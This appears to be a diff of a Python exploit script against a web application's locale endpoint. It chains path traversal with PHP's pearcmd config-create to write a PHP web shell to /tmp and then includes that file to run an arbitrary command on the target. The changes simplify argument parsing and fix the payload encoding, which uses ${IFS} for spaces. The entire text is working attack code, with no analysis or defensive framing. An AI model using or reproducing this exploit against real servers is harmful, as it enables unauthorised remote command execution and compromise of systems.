@@ -22,51 +22,39 @@ if len(sys.argv) < 5:
 
 target = None
 command = None
-pear_path = "/usr/share/php/PEAR"  # default
+pear_path = "/usr/share/php"
 
-# Simple argument parsing
 for i in range(len(sys.argv)):
     if sys.argv[i] == "--target":
-        try:
-            target = sys.argv[i + 1]
-        except IndexError:
-            print("[-] --target requires a value")
-            sys.exit(1)
-
+        target = sys.argv[i + 1]
     if sys.argv[i] == "--cmd":
-        try:
-            command = sys.argv[i + 1]
-        except IndexError:
-            print("[-] --cmd requires a value")
-            sys.exit(1)
-
+        command = sys.argv[i + 1]
     if sys.argv[i] == "--path":
-        try:
-            pear_path = sys.argv[i + 1]
-        except IndexError:
-            print("[-] --path requires a value")
-            sys.exit(1)
+        pear_path = sys.argv[i + 1]
 
 if not target or not command:
     print("[-] Missing required arguments.")
-    print(f"Usage: {sys.argv[0]} --target <host> --cmd <command> [--path <pear_path>]")
     sys.exit(1)
 
-payload = command.replace(' ', '\\$\\\\{IFS\\\\}')
+# Escape spaces properly
+payload = command.replace(" ", "${IFS}")
 
-# Step 1 - Write payload
+print("[*] Writing payload...")
+
 os.system(
-    f"curl \"http://{target}/locales/locale.json?"
-    f"+config-create+/&locale=../../../../../{pear_path}"
-    f"&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\""
+    f'curl "http://{target}/locales/locale.json?'
+    f'+config-create+/tmp/payload.php+/%3C?=system(\'{payload}\');?>'
+    f'&locale=../../../../../../{pear_path}'
+    f'&namespace=pearcmd"'
 )
 
-# Step 2 - Trigger payload
+print("[*] Triggering payload...")
+
 os.system(
-    f"curl \"http://{target}/locales/locale.json?"
-    f"locale=../../../../../tmp&namespace=payload\""
+    f'curl "http://{target}/locales/locale.json?'
+    f'locale=../../../../../../tmp'
+    f'&namespace=payload"'
 )
-```
 
 
 
